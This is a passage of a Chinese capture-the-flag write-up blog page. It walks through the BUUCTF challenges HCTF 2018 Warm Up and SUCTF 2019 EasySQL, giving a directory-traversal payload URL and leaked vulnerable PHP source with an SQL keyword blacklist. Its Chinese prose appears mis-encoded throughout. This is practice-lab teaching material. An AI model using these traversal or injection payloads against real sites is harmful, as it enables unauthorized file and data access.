<!DOCTYPE HTML>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

    

    <title>BUUCTF Write Up(æŒç»­æ›´æ–°) | 2h0nG&#39;s Blog</title>
    <meta name="author" content="John Doe">
    
    <meta name="description" content="Love is friendship fell into love">
    
    
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

    <meta property="og:title" content="BUUCTF Write Up(æŒç»­æ›´æ–°)"/>
    <meta property="og:site_name" content="2h0nG&#39;s Blog"/>

    
    <meta property="og:image" content=""/>
    

    <link rel="icon" type="image/png" href="/favicon.png">
    <link rel="alternate" href="/atom.xml" title="2h0nG&#39;s Blog" type="application/atom+xml">
    <link rel="stylesheet" href="/css/lib/materialize.min.css">
    <link rel="stylesheet" href="/css/lib/font-awesome.min.css">
    <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">

    
        <link rel="stylesheet" href="/css/lib/prettify-tomorrow-night-eighties.css" type="text/css">
    
    <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
<meta name="generator" content="Hexo 5.0.0"></head>


<body>
    <img src="/weixin_favicon.png" style="position: absolute; left: -9999px; opacity: 0; filter: alpha(opacity=0);">

    <nav class="indigo">
    <div class="nav-wrapper">
        <a href="#" data-activates="main-menu" class="button-collapse">
            <i class="fa fa-navicon"></i>
        </a>
        <div class="">
            <a href="/" class="brand-logo hide-on-med-and-down">2h0nG&#39;s Blog</a>
            <ul class="right hide-on-med-and-down">
                
                    <li>
                        <a class="menu-home " href="/" >
                            <i class="fa fa-home "></i>
                            
                            é¦–é¡µ
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-archive " href="/archives" >
                            <i class="fa fa-archive "></i>
                            
                            å½’æ¡£
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-category category-menu" href="javascript:;" data-activates="category-menu" >
                            <i class="fa fa-bookmark "></i>
                            
                            åˆ†ç±»
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-reading " href="/reading" >
                            <i class="fa fa-book "></i>
                            
                            è¯»ä¹¦
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-about " href="/about" >
                            <i class="fa fa-user "></i>
                            
                            å…³äº
                        </a>
                    </li>
                
                    <li>
                        <a class="menu-search modal-trigger " href="#search" >
                            <i class="fa fa-search "></i>
                            
                            æœç´¢
                        </a>
                    </li>
                
            </ul>
            <div>
    <ul class="side-nav indigo darken-1" id="main-menu">
        
        <li class="side-user">
            <div class="row">
                <div class="col s4 no-padding">
                    <img class="avatar-image circle responsive-img" src="http://ww2.sinaimg.cn/small/74990035jw1f1rjkd681bj20rs0rsdhg.jpg" alt="User Avatar">
                </div>
                <div class="info col s8 valign-wrapper no-padding">
                    <div class="valign">
                        <p class="name">2h0nG</p>
                        <p class="desc">ä¸æ–­å­¦ä¹ ä¸­</p>
                    </div>
                </div>
            </div>
        </li>
        

        
            <li class="no-padding">
                <a class="waves-effect menu-home " href="/" >
                    <i class="fa fa-home "></i>
                    
                    é¦–é¡µ
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-archive " href="/archives" >
                    <i class="fa fa-archive "></i>
                    
                    å½’æ¡£
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-category category-menu" href="javascript:;" data-activates="category-menu" >
                    <i class="fa fa-bookmark "></i>
                    
                    åˆ†ç±»
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-reading " href="/reading" >
                    <i class="fa fa-book "></i>
                    
                    è¯»ä¹¦
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-about " href="/about" >
                    <i class="fa fa-user "></i>
                    
                    å…³äº
                </a>
            </li>
        
            <li class="no-padding">
                <a class="waves-effect menu-search modal-trigger " href="#search" >
                    <i class="fa fa-search "></i>
                    
                    æœç´¢
                </a>
            </li>
        
    </ul>

    <ul class="side-nav indigo darken-1" id="category-menu">
    

            

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/æ•°æ®é€šä¿¡å®‰å…¨/">
                    æ•°æ®é€šä¿¡å®‰å…¨ <span class="right">30 ç¯‡</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/ä»£ç å®¡è®¡å®‰å…¨/">
                    ä»£ç å®¡è®¡å®‰å…¨ <span class="right">10 ç¯‡</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/Linuxç³»ç»Ÿå®‰å…¨/">
                    Linuxç³»ç»Ÿå®‰å…¨ <span class="right">13 ç¯‡</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/Webæ¸—é€æµ‹è¯•/">
                    Webæ¸—é€æµ‹è¯• <span class="right">27 ç¯‡</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/CTFç¬”è®°/">
                    CTFç¬”è®° <span class="right">16 ç¯‡</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/Pythonå­¦ä¹ /">
                    Pythonå­¦ä¹  <span class="right">3 ç¯‡</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/Leetcodeé¢˜è§£/">
                    Leetcodeé¢˜è§£ <span class="right">24 ç¯‡</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/æ¼æ´å¤ç°ä¸åˆ†æ/">
                    æ¼æ´å¤ç°ä¸åˆ†æ <span class="right">5 ç¯‡</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/æ•°æ®æ¢å¤/">
                    æ•°æ®æ¢å¤ <span class="right">2 ç¯‡</span></a>
                </a>
            </li>

        

            <li class="collapse-level-0" collapse-level="0">
                <a class="no-padding" href="/categories/å†…ç½‘æ¸—é€/">
                    å†…ç½‘æ¸—é€ <span class="right">2 ç¯‡</span></a>
                </a>
            </li>

        

    </ul>
</div>

        </div>
    </div>
</nav>

<div id="search" class="modal search-modal">
    <div class="row">
        <div class="input-field col s12">
              <input id="search-input" type="text">
              <label for="search-input">æœç´¢</label>
        </div>

    </div>
    <div id="search-result" class="search-result col s12">

    </div>
</div>


    <main>
        <div class="container main-container">
    <nav class="page-nav hide-on-small-only">
    <div class="nav-wrapper indigo">
        <span class="breadcrumb">å½“å‰ä½ç½®ï¼ˆåˆ†ç±»ç›®å½•ï¼‰</span>
        
            
    
    
    <a class="breadcrumb" href="/categories/CTFç¬”è®°/">CTFç¬”è®°</a>


        

        
    </div>
</nav>

<article>
    <div class="card">
        <div class="card-content">
            

            <div class="article-title">
                
    
        <h1>BUUCTF Write Up(æŒç»­æ›´æ–°)</h1>
    


            </div>
            <time class="pink-link-context" datetime="2020-11-18T16:00:00.000Z"><a href="/2020/11/19/CTF%E7%AC%94%E8%AE%B0/BUUCTF%20Write%20Up(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/">2020-11-19</a></time>

            <span id="busuanzi_container_page_pv" class="read-times-container">
    <i class="fa fa-eye"></i>
    <span id="busuanzi_value_page_pv"></span>
</span>

            
    <div class="tags-row">
        
            <a href="/tags/CTFç¬”è®°/" class="chip pink lighten-1">CTFç¬”è®°</a>
        
    </div>


            <div class="toc pink-link-context hide-on-med-and-down">
    <ol class="section table-of-contents"><li class="section table-of-contents-item section table-of-contents-level-2"><a class="section table-of-contents-link" href="#BUUCTF-Write-Up"><span class="section table-of-contents-text">BUUCTF Write Up</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%80%E3%80%81-HCTF-2018-Warm-Up"><span class="section table-of-contents-text">ä¸€ã€[HCTF 2018]Warm Up</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E3%80%81-SUCTF-2019-EasySQL1"><span class="section table-of-contents-text">äºŒã€[SUCTF 2019]EasySQL1</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#%E8%A7%A3%E6%B3%951%EF%BC%9A"><span class="section table-of-contents-text">è§£æ³•1ï¼š</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9A"><span class="section table-of-contents-text">è§£æ³•2ï¼š</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="section table-of-contents-text">æ€»ç»“ï¼š</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%89%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Secret-File"><span class="section table-of-contents-text">ä¸‰ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%9B%9B%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL"><span class="section table-of-contents-text">å››ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%94%E3%80%81-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="section table-of-contents-text">äº”ã€[ACTF2020 æ–°ç”Ÿèµ›]Include</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%85%AD%E3%80%81-%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="section table-of-contents-text">å…­ã€[æŠ¤ç½‘æ¯ 2018]easy_tornado</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%83%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-LoveSQL"><span class="section table-of-contents-text">ä¸ƒã€[æå®¢å¤§æŒ‘æˆ˜ 2019]LoveSQL</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%85%AB%E3%80%81-GXYCTF2019-Ping-Ping-Ping"><span class="section table-of-contents-text">å…«ã€[GXYCTF2019]Ping Ping Ping</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B9%9D%E3%80%81-RoarCTF-2019-Easy-Calc"><span class="section table-of-contents-text">ä¹ã€[RoarCTF 2019]Easy Calc</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E3%80%81-HCTF-2018-admin"><span class="section table-of-contents-text">åã€[HCTF 2018]admin</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E4%B8%80%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="section table-of-contents-text">åä¸€ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]BabySQL</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="section table-of-contents-text">åäºŒã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E4%B8%89%E3%80%81-SUCTF-2019-CheckIn"><span class="section table-of-contents-text">åä¸‰ã€[SUCTF 2019]CheckIn</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E5%9B%9B%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag"><span class="section table-of-contents-text">åå››ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E4%BA%94%E3%80%81-BJDCTF2020-Easy-MD5"><span class="section table-of-contents-text">åäº”ã€[BJDCTF2020]Easy MD5</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E5%85%AD%E3%80%81-ZJCTF-2019-NiZhuanSiWei"><span class="section table-of-contents-text">åå…­ã€[ZJCTF 2019]NiZhuanSiWei</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E4%B8%83%E3%80%81-CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day2-Web1-Hack-World"><span class="section table-of-contents-text">åä¸ƒã€[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E5%85%AB%E3%80%81-%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook"><span class="section table-of-contents-text">åå…«ã€[ç½‘é¼æ¯ 2018]Fakebook</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E5%8D%81%E4%B9%9D%E3%80%81-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL"><span class="section table-of-contents-text">åä¹ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E3%80%81-GXYCTF2019-BabySQli"><span class="section table-of-contents-text">äºŒåã€[GXYCTF2019]BabySQli</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E4%B8%80%E3%80%81-%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz"><span class="section table-of-contents-text">äºŒåä¸€ã€[ç½‘é¼æ¯ 2020 é’é¾™ç»„]AreUSerialz</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E4%BA%8C%E3%80%81-BJDCTF-2nd-fake-google"><span class="section table-of-contents-text">äºŒåäºŒã€[BJDCTF 2nd]fake google</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E4%B8%89%E3%80%81-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2"><span class="section table-of-contents-text">äºŒåä¸‰ã€[å¼ºç½‘æ¯ 2019]é«˜æ˜çš„é»‘å®¢</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E5%9B%9B%E3%80%81-GYCTF2020-Blacklist"><span class="section table-of-contents-text">äºŒåå››ã€[GYCTF2020]Blacklist</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E4%BA%94%E3%80%81-RoarCTF-2019-Easy-Java"><span class="section table-of-contents-text">äºŒåäº”ã€[RoarCTF 2019]Easy Java</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E5%85%AD%E3%80%81-BUUCTF-2018-Online-Tool"><span class="section table-of-contents-text">äºŒåå…­ã€[BUUCTF 2018]Online Tool</span></a><ol class="section table-of-contents-child"><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#%E9%87%8D%E7%82%B9%E5%87%BD%E6%95%B0%EF%BC%9A"><span class="section table-of-contents-text">é‡ç‚¹å‡½æ•°ï¼š</span></a></li><li class="section table-of-contents-item section table-of-contents-level-4"><a class="section table-of-contents-link" href="#Shell%E4%B8%AD%E7%9A%84%E9%87%8D%E7%82%B9%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%9A"><span class="section table-of-contents-text">Shellä¸­çš„é‡ç‚¹åŸºç¡€çŸ¥è¯†ï¼š</span></a></li></ol></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E4%B8%83%E3%80%81-MRCTF2020-%E4%BD%A0%E4%BC%A0%E4%BD%A0%F0%9F%90%8E%E5%91%A2"><span class="section table-of-contents-text">äºŒåä¸ƒã€[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E5%85%AB%E3%80%81"><span class="section table-of-contents-text">äºŒåå…«ã€</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%BA%8C%E5%8D%81%E4%B9%9D%E3%80%81CVE-2020-7066"><span class="section table-of-contents-text">äºŒåä¹ã€CVE-2020-7066</span></a></li><li class="section table-of-contents-item section table-of-contents-level-3"><a class="section table-of-contents-link" href="#%E4%B8%89%E5%8D%81%E3%80%81"><span class="section table-of-contents-text">ä¸‰åã€</span></a></li></ol></li></ol>
</div>


            <div class="entry pink-link-context">
                <h2 id="BUUCTF-Write-Up"><a href="#BUUCTF-Write-Up" class="headerlink" title="BUUCTF Write Up"></a>BUUCTF Write Up</h2><h3 id="ä¸€ã€-HCTF-2018-Warm-Up"><a href="#ä¸€ã€-HCTF-2018-Warm-Up" class="headerlink" title="ä¸€ã€[HCTF 2018]Warm Up"></a>ä¸€ã€[HCTF 2018]Warm Up</h3><p>å¼€å±€ä¸€æ»‘ç¨½ï¼Œæºç æ‰¾ç„æœºã€‚source.phpï¼Œå…³é”®åœ¨è¿™é‡Œã€‚</p>
<p>â€‹    å®¡è®¡æºç ï¼Œç›®çš„æ˜¯ç»•è¿‡ä»¥ä¸‹ä¸»å‡½æ•°ä»£ç ï¼Œéœ€è¦ä¼ å…¥ä¸€ä¸ªå‚æ•°fileï¼Œå¹¶ä¸”é€šè¿‡å­—ç¬¦ä¸²æ£€æŸ¥å’Œä¸€ä¸ªemmmç±»ä¸­çš„checkFileæ–¹æ³•çš„æ£€æŸ¥ï¼Œæœ€ç»ˆæ‰§è¡Œä¸€ä¸ªincludeå‡½æ•°ï¼Œè¿™é‡Œæ˜æ˜¾æ˜¯é€šè¿‡æ£€æŸ¥å¹¶ä¸”é€šè¿‡includeè¯»å–flagæ–‡ä»¶ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>

<p>â€‹    å®¡è®¡checkfileæ–¹æ³•ï¼Œå‘ç°æœ‰ä¸€ä¸ªç™½åå•æ•°ç»„ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªhint.phpï¼Œæ‰“å¼€ä¸€çœ‹ï¼ŒåŸæ¥æ˜¯æç¤ºäº†flagçš„æ–‡ä»¶å</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p>mb_substr(arg1,arg2,arg3)ï¼šä»arg1ä¸­æˆªå–arg2-arg3çš„å­—ç¬¦ä¸²ï¼›mb_strpos(arg1,arg2)ï¼šä»arg1ä¸­æ‰¾åˆ°arg2ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ã€‚</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];    #ç™½åå•</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;    #æ˜¯å¦ä¼ å…¥å‚æ•°ï¼Œæ˜¯å¦å‚æ•°ä¸ºå­—ç¬¦ä¸²</span><br><span class="line">                echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            if (in_array($page, $whitelist)) &#123;    #åˆ¤æ–­å‚æ•°æ˜¯å¦åœ¨ç™½åå•ï¼Œå¦‚æœä¸åœ¨ç»§ç»­åˆ¤æ–­</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; mb_substr(    #æˆªå–ç¬¬ä¸€ä¸ª?å‰çš„å€¼ï¼Œå¦‚æœæ²¡?ï¼Œåˆ™æ˜¯æ•´ä¸ªå­—ç¬¦ä¸²ï¼Œå› ä¸ºå‡½æ•°ä¸­è‡ªå·±åŠ äº†ä¸€ä¸ª?</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)    </span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;    #å†æ¬¡åˆ¤æ–­æ˜¯å¦åœ¨ç™½åå•ï¼Œå¦‚æœä¸åœ¨ç»§ç»­åˆ¤æ–­ï¼Œè¿™é‡Œåœ¨?å‰åŠ ä¸€ä¸ªç™½åå•çš„å€¼å…¶å®å°±å¯ä»¥æ„é€ payloadäº†ã€‚</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page &#x3D; urldecode($page);    #è¿™é‡Œè¿›è¡Œä¸€æ¬¡urlè§£ç </span><br><span class="line">            $_page &#x3D; mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)    #ç„¶åæˆªå–ç¬¬ä¸€ä¸ª?å‰çš„å€¼åˆ¤æ–­æ˜¯å¦åœ¨ç™½åå•</span><br><span class="line">            );</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#39;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>urldecodeè§£ç å‰çš„åˆ¤æ–­å°±å·²ç»å¯ä»¥æ„é€ payloadäº†ï¼Œé€šè¿‡å¯¹payloadçš„æ„é€ å¯ä»¥å®ç°ç›®å½•ä»»æ„ç©¿è¶Šè¯»å–ã€‚ä¸åœçš„å°è¯•ï¼Œæœ€ç»ˆè¯»å–åˆ°flag</p>
<p>Payloadï¼š<code>http://4526f00b-4a4c-435b-9112-69769b94c105.node3.buuoj.cn/source.php?file=hint.php?/../../../../ffffllllaaaagggg</code></p>
<h3 id="äºŒã€-SUCTF-2019-EasySQL1"><a href="#äºŒã€-SUCTF-2019-EasySQL1" class="headerlink" title="äºŒã€[SUCTF 2019]EasySQL1"></a>äºŒã€[SUCTF 2019]EasySQL1</h3><p>nmdï¼Œè¿™é¢˜å¤´å¾—å¤šé“èƒ½çŒœåˆ°åå°æºç æ˜¯ï¼š<code>select $_POST[&#39;query&#39;]||flag from Flag</code>ï¼Œè¿™å°±æ˜¯å¤§ä½¬çš„ä¸–ç•Œï¼Ÿå®Œå…¨æ²¡é€»è¾‘çš„çŒœæµ‹ã€‚å¬è¯´CTFç°åœºæœ‰æºç æ³„éœ²ï¼Œä½†æ˜¯BUUCTFä¸Šæ²¡æœ‰è¿›è¡Œå¤ç°ï¼Œå…·ä½“æ€ä¹ˆæ³„éœ²çš„æºç ä¹Ÿæ²¡æœ‰æ‰¾åˆ°WriteUpï¼ŒOkã€‚</p>
<p>å¦å¤–ï¼Œæ­¤é¢˜é‡‡ç”¨<code>mysqli_multi_query()</code>è¿è¡ŒSQLè¯­å¥ï¼Œæ‰€ä»¥æ˜¯å¯å †å æ³¨å…¥ã€‚</p>
<p>æ³„éœ²çš„æºç å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;&#x2F; a&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;query&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    if(isset($post[&#39;query&#39;]))&#123;</span><br><span class="line">        $BlackList &#x3D; &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;</span><br><span class="line">        &#x2F;&#x2F;var_dump(preg_match(&quot;&#x2F;&#123;$BlackList&#125;&#x2F;is&quot;,$post[&#39;query&#39;]));</span><br><span class="line">        if(preg_match(&quot;&#x2F;&#123;$BlackList&#125;&#x2F;is&quot;,$post[&#39;query&#39;]))&#123;</span><br><span class="line">            &#x2F;&#x2F;echo $post[&#39;query&#39;];</span><br><span class="line">            die(&quot;Nonono.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(strlen($post[&#39;query&#39;])&gt;40)&#123;</span><br><span class="line">            die(&quot;Too long.&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql &#x3D; &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;</span><br><span class="line">        mysqli_multi_query($MysqlLink,$sql);</span><br><span class="line">        do&#123;</span><br><span class="line">            if($res &#x3D; mysqli_store_result($MysqlLink))&#123;</span><br><span class="line">                while($row &#x3D; mysqli_fetch_row($res))&#123;</span><br><span class="line">                    print_r($row);</span><br><span class="line">                